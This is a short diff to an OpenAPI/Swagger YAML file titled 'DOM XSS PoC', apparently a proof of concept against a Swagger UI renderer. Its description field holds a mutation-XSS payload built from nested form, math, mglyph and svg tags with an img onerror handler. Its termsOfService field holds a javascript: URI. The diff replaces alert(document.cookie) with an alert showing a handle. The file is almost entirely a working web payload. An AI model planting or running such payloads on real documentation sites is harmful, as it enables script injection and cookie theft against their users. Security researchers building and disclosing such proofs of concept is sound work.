@@ -6,8 +6,8 @@ securityDefinitions:
 info:
   version: "0.0.1"
   title: DOM XSS PoC
-  description: '<form><math><mtext></form><form><mglyph><svg><mtext><style><path id="</style><img onerror=alert(document.cookie) src>">'
-  termsOfService: "javascript:alert(document.cookie)"
+  description: '<form><math><mtext></form><form><mglyph><svg><mtext><style><path id="</style><img onerror=alert("0xmagdy") src>">'
+  termsOfService: "javascript:alert("0xmagdy")"
 paths:
   /:
     get:
